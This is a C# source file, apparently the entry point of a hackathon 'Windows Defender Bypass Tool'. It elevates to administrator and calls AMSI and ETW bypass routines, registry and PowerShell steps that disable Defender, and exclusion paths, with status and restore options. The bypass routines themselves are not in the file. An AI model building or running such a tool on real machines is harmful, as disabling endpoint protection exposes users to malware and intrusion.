using System;
using System.Linq;

namespace WindowsDefenderBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("=== Windows Defender Bypass Tool ===");
            Console.WriteLine("Educational Purpose Only - GreenHat Hackathon\n");

            if (!SecurityHelper.IsUserAnAdmin())
            {
                Console.WriteLine("[!] Administrator privileges required. Requesting elevation...");
                SecurityHelper.RequestAdminElevation();
                return;
            }

            Console.WriteLine("[+] Running with administrator privileges\n");

            if (args.Length > 0)
            {
                switch (args[0].ToLower())
                {
                    case "status":
                    case "-s":
                    case "--status":
                        StatusChecker.ShowStatus();
                        break;
                    case "restore":
                    case "revert":
                    case "-r":
                    case "--restore":
                        Console.WriteLine("[*] Restoring Windows Defender settings...");
                        DefenderManager.RestoreDefender();
                        Console.WriteLine("[+] Restoration complete!");
                        break;
                    case "help":
                    case "-h":
                    case "--help":
                        ShowHelp();
                        break;
                    default:
                        Console.WriteLine($"[!] Unknown argument: {args[0]}\n");
                        ShowHelp();
                        break;
                }
                return;
            }

            try
            {
                Console.WriteLine("[*] Starting Windows Defender bypass...\n");

                Console.WriteLine("[*] Attempting AMSI bypass...");
                AMSIBypass.AttemptBypass();

                Console.WriteLine("[*] Attempting ETW bypass...");
                ETWBypass.AttemptBypass();

                Console.WriteLine("[*] Modifying registry settings...");
                RegistryManager.DisableDefenderViaRegistry();

                Console.WriteLine("[*] Modifying Defender preferences via PowerShell...");
                DefenderManager.DisableDefender();

                Console.WriteLine("[*] Adding common exclusion paths...");
                ExclusionManager.AddCommonExclusions();

                Console.WriteLine("\n[+] Windows Defender bypass completed successfully!");
                Console.WriteLine("[*] Use '--status' to verify current Defender state");
                Console.WriteLine("[*] Use '--restore' to re-enable Windows Defender");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                Console.WriteLine($"[!] Stack trace: {ex.StackTrace}");
            }

            Console.WriteLine("\nPress any key to exit...");
            Console.ReadKey();
        }

        static void ShowHelp()
        {
            Console.WriteLine("Usage:");
            Console.WriteLine("  WindowsDefenderBypass.exe              - Run bypass");
            Console.WriteLine("  WindowsDefenderBypass.exe --status     - Check Defender status");
            Console.WriteLine("  WindowsDefenderBypass.exe --restore    - Restore Defender settings");
            Console.WriteLine("  WindowsDefenderBypass.exe --help      - Show this help");
        }
    }
}
